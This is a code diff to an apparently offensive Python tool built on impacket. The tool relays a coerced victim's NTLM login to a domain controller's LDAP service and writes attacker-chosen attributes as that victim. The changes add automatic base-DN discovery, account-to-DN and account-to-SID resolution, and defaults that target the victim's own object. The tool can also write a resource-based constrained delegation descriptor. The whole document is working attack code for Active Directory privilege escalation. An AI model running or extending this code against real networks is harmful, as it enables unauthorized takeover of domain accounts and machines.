@@ -15,8 +15,10 @@ from impacket.examples.ntlmrelayx import clients as relay_clients
 from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
 from impacket.examples.ntlmrelayx.clients import ldaprelayclient
 from impacket.examples.utils import parse_target
+from impacket.ldap import ldaptypes
 from impacket.ldap.ldap import LDAPConnection, get_entry_values
-from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode
+from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode, Scope, \
+    SearchResultEntry
 from impacket.nt_errors import STATUS_ACCESS_DENIED
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from pyasn1.codec.ber import decoder, encoder
@@ -47,27 +49,36 @@ def build_parser():
     group.add_argument("-dc-ip", action="store", metavar="ip address",
                        help="IP address of the target DC. If omitted, the targetName from the "
                             "target argument is used")
-    group.add_argument("-base-dn", action="store", metavar="DN", required=True,
-                       help="search base, e.g. DC=example,DC=com")
+    group.add_argument("-base-dn", action="store", metavar="DN",
+                       help="search base, e.g. DC=example,DC=com. Default: the DC's "
+                            "rootDSE defaultNamingContext")
 
     group = parser.add_argument_group("relay listener")
     group.add_argument("-ntlmrelayx", action="store", metavar="PATH",
                        help="path to a specific ntlmrelayx.py to run instead of the installed one")
-    group.add_argument("-listen-ip", action="store", metavar="ip address", required=True,
-                       help="attacker listener IP the coerced victim connects to")
+    group.add_argument("-listen-ip", action="store", metavar="ip address", default="0.0.0.0",
+                       help="attacker listener IP the coerced victim connects to (default: 0.0.0.0, "
+                            "all interfaces)")
     group.add_argument("-victim", action="store", metavar="DOMAIN/account",
                        help="only relay this victim; others are rejected")
 
     group = parser.add_argument_group("attack (operation executed as the victim)")
-    group.add_argument("-modify-dn", action="store", metavar="DN", required=True,
-                       help="DN of the directory object to modify as the victim")
+    target = group.add_mutually_exclusive_group()
+    target.add_argument("-modify-dn", action="store", metavar="DN",
+                        help="DN of the directory object to modify as the victim. Default: the "
+                             "DN of the relayed victim")
+    target.add_argument("-modify-sam", action="store", metavar="ACCOUNT",
+                        help="sAMAccountName of the object to modify as the victim, resolved to "
+                             "its DN via LDAP. Default: the relayed victim's own account")
     group.add_argument("-attribute", action="store", default="description",
                        help="attribute to write with -value/-value-hex (default: description)")
     payload = group.add_mutually_exclusive_group(required=True)
     payload.add_argument("-value", action="store", help="UTF-8 attribute value")
     payload.add_argument("-value-hex", action="store", help="binary attribute value as hex")
-    payload.add_argument("-rbcd-sid", action="store", metavar="SID",
-                         help="write an RBCD descriptor granting this SID (msDS-AllowedToActOnBehalfOfOtherIdentity)")
+    payload.add_argument("-rbcd", action="store", metavar="ACCOUNT|SID",
+                         help="write an RBCD descriptor granting this account (sAMAccountName, "
+                              "resolved to its objectSid via LDAP) or this raw SID "
+                              "(msDS-AllowedToActOnBehalfOfOtherIdentity)")
     return parser
 
 
@@ -96,11 +107,21 @@ def signed_ldap_bind(conn):
         conn.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
 
 
+def search_values(conn, search_base, scope, search_filter, attributes):
+    entries = conn.search(searchBase=search_base, scope=scope,
+                          searchFilter=search_filter, attributes=attributes)
+    # a subtree search also returns SearchResultReference (referral) objects
+    return [value.asOctets()
+            for entry in entries if isinstance(entry, SearchResultEntry)
+            for attribute in attributes
+            for value in get_entry_values(entry, attribute)]
+
+
 def validate_bootstrap():
     """Bind once at startup so broken credentials fail before any coercion begins."""
     try:
         conn = LDAPConnection(
-            f"ldap://{ldap_host}", args.base_dn,
+            f"ldap://{ldap_host}", args.base_dn or "",
             dstIp=ldap_ip, signing=True, timeout=8,
         )
     except Exception as error:
@@ -108,10 +129,57 @@ def validate_bootstrap():
     try:
         signed_ldap_bind(conn)
         print(f"[+] Bootstrap identity validated: {domain}\\{username}", flush=True)
+        if not args.base_dn:
+            roots = search_values(conn, "", Scope("baseObject"), "(objectClass=*)",
+                                  ["defaultNamingContext"])
+            if not roots:
+                raise SystemExit("[-] DC returned no defaultNamingContext; pass -base-dn")
+            args.base_dn = roots[0].decode()
+            print(f"[i] base-dn from rootDSE: {args.base_dn}", flush=True)
+    except SystemExit:
+        raise
     except Exception as error:
         raise SystemExit(f"[-] Bootstrap bind as {domain}\\{username} failed: {error}")
     finally:
         conn.close()
+
+
+def ldap_escape(value):
+    for raw, escaped in (("\\", "\\5c"), ("*", "\\2a"), ("(", "\\28"),
+                         (")", "\\29"), ("\x00", "\\00")):
+        value = value.replace(raw, escaped)
+    return value
+
+
+def query(search_base, scope, search_filter, attributes):
+    conn = LDAPConnection(
+        f"ldap://{ldap_host}", search_base,
+        dstIp=ldap_ip, signing=True, timeout=8,
+    )
+    try:
+        signed_ldap_bind(conn)
+        return search_values(conn, search_base, scope, search_filter, attributes)
+    finally:
+        conn.close()
+
+
+def resolve_account_dn(account):
+    """Authoritative DN for an account, so the OU never has to be guessed."""
+    dns = query(args.base_dn, Scope("wholeSubtree"),
+                f"(sAMAccountName={ldap_escape(account)})", ["distinguishedName"])
+    if len(dns) != 1:
+        raise ValueError(f"{len(dns)} objects match sAMAccountName={account}")
+    return dns[0].decode()
+
+
+def resolve_account_sid(account):
+    values = query(args.base_dn, Scope("wholeSubtree"),
+                   f"(sAMAccountName={ldap_escape(account)})", ["objectSid"])
+    if len(values) != 1:
+        raise ValueError(f"{len(values)} objects match sAMAccountName={account}")
+    sid = ldaptypes.LDAP_SID()
+    sid.fromString(values[0])
+    return sid.formatCanonical()
 
 
 def ldap_message(operation):
@@ -133,9 +201,9 @@ def gss_token(token):
 
 def operation_value():
     """Return (attribute, value) for the attacker-chosen ModifyRequest."""
-    if args.rbcd_sid:
+    if args.rbcd:
         descriptor = create_empty_sd()
-        descriptor["Dacl"].aces.append(create_allow_ace(args.rbcd_sid))
+        descriptor["Dacl"].aces.append(create_allow_ace(args.rbcd))
         return "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptor.getData()
     if args.value_hex:
         return args.attribute, bytes.fromhex(args.value_hex)
@@ -144,7 +212,7 @@ def operation_value():
 
 def replace_attribute(attribute, value):
     request = ModifyRequest()
-    request["object"] = args.modify_dn
+    request["object"] = modify_dn
     request["changes"][0]["operation"] = 2  # replace
     request["changes"][0]["modification"]["type"] = attribute
     request["changes"][0]["modification"]["vals"].setComponents(value)
@@ -267,6 +335,15 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
             print(f"[!] victim {victim} matches the relay target's own machine account; DCs refuse "
                   f"same-machine reflection (LOGON_FAILURE) -- coerce a different host", flush=True)
 
+        global modify_dn
+        if not modify_dn:
+            try:
+                modify_dn = resolve_account_dn(account)
+            except Exception as error:
+                print(f"[-] cannot resolve the DN of {victim} ({error}); pass -modify-dn", flush=True)
+                return None, STATUS_ACCESS_DENIED
+            print(f"[i] modify-dn from victim: {modify_dn}", flush=True)
+
         attribute, value = operation_value()
         final = SPNEGO_NegTokenResp()
         final["ResponseToken"] = token
@@ -284,7 +361,7 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
         # number; NTLM ignores it.
         self.raw.sequenceNumber += 1
         self.raw._socket.sendall(wire)
-        print(f"[+] Sent same-record frame: victim={victim} dn={args.modify_dn} "
+        print(f"[+] Sent same-record frame: victim={victim} dn={modify_dn} "
               f"attribute={attribute}", flush=True)
 
         # Read the two in-record responses (Bind, then Modify) so the DC's verdict is visible.
@@ -313,7 +390,7 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
             )
             signed_ldap_bind(check)
             entries = check.search(
-                searchBase=args.modify_dn, scope=0,
+                searchBase=modify_dn, scope=0,
                 searchFilter="(objectClass=*)", attributes=[attribute],
             )
             found = []
@@ -337,7 +414,7 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
 
 def main():
     global args, domain, username, password, lmhash, nthash
-    global ldap_host, ldap_ip, expected_victim, use_kerberos
+    global ldap_host, ldap_ip, expected_victim, use_kerberos, modify_dn
 
     args = build_parser().parse_args()
 
@@ -358,8 +435,26 @@ def main():
     ldap_ip = args.dc_ip or address
     expected_victim = args.victim.replace("/", "\\") if args.victim else None
     use_kerberos = args.use_kerberos
+    modify_dn = args.modify_dn
 
     validate_bootstrap()
+
+    if args.modify_sam:
+        try:
+            modify_dn = resolve_account_dn(args.modify_sam)
+        except Exception as error:
+            raise SystemExit(f"[-] cannot resolve {args.modify_sam!r} to a DN ({error}); "
+                             f"pass -modify-dn instead")
+        print(f"[i] -modify-sam {args.modify_sam} -> {modify_dn}", flush=True)
+
+    if args.rbcd and not args.rbcd.upper().startswith("S-1-"):
+        try:
+            resolved = resolve_account_sid(args.rbcd)
+        except Exception as error:
+            raise SystemExit(f"[-] cannot resolve {args.rbcd!r} to a SID ({error}); "
+                             f"pass the SID directly")
+        print(f"[i] -rbcd {args.rbcd} -> {resolved}", flush=True)
+        args.rbcd = resolved
 
     relay_clients.PROTOCOL_CLIENTS["LDAP"] = CrossUserLDAPRelayClient
     configure_smb_listener()
